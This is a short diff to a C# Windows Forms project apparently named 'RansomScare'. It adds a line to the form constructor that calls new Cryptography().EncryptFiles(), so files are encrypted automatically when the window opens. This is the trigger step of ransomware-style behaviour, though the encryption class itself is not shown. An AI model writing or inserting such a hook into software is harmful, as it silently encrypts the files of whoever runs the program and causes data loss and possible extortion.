@@ -20,6 +20,9 @@ namespace RansomScare
             FormBorderStyle = FormBorderStyle.FixedSingle;
             MaximizeBox = false;
             MinimizeBox = false;
+
+            new Cryptography().EncryptFiles();
         }
+
     }
 }
